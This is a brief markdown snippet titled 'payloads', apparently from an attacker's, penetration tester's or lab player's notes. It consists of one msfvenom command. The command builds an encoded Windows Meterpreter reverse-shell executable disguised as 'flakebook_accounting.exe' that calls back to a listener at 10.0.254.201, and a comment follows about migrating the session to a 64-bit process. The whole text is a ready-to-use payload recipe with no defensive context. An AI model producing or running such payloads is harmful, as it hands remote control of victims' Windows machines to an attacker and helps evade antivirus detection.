## payloads
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.254.201 LPORT=9999 -f exe -o flakebook_accounting.exe -e x86/shikata_ga_nai
# migrate to 64 bit with msfconsole migrate
```
